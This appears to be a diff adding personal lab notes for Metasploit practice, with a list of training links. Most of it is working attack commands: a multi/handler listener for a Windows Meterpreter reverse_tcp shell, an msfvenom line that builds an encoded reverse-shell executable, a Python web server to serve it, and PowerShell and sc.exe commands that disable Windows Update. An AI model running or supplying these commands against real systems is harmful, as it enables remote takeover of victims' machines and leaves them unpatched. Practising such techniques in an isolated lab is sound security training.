@@ -1,0 +1,56 @@
+Handler
+
+mkdir -p /home/kali/Desktop/Metasploit-testing
+cd /home/kali/Desktop/Metasploit-testing
+msfconsole -q
+
+setg LogLevel 3
+set ConsoleLogging true
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.54.186 ### (Kali IP)
+set LPORT 443
+
+makerc  reverse_tcp-handler.rc
+exploit
+
+msfconsole -qr reverse_tcp-handler.rc
+
+----------------------------------------------------------
+
+Payload
+
+msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.54.13 ###(Kali IP) LPORT=443 -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -f exe -o rshell.exe
+
+----------------------------------------------------------
+
+Web Server
+
+python3 -m http.server 8888
+
+----------------------------------------------------------
+
+Windows
+sc.exe stop wuauserv
+sc.exe config wuauserv start= disabled
+New-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows -Name WindowsUpdate
+New-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate -Name AU
+New-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU -Name NoAutoUpdate -Value 1
+
+
+---------------------------------------------------------
+
+Links:
+
+https://www.hacker101.com/playlists/newcomers
+https://www.hackerone.com/hackers/hacker101
+https://www.offsec.com/metasploit-unleashed/
+https://www.exploit-db.com/
+https://docs.rapid7.com/metasploit/msf-overview/
+https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
+https://github.com/rapid7/metasploitable3
+https://nooblinux.com/metasploit-tutorial/
+https://www.varonis.com/blog/what-is-metasploit
+https://www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you%E2%80%99ll-ever-read.pdf
+https://vulnhub.com/resources/
+https://www.hacker101.com/videos.html
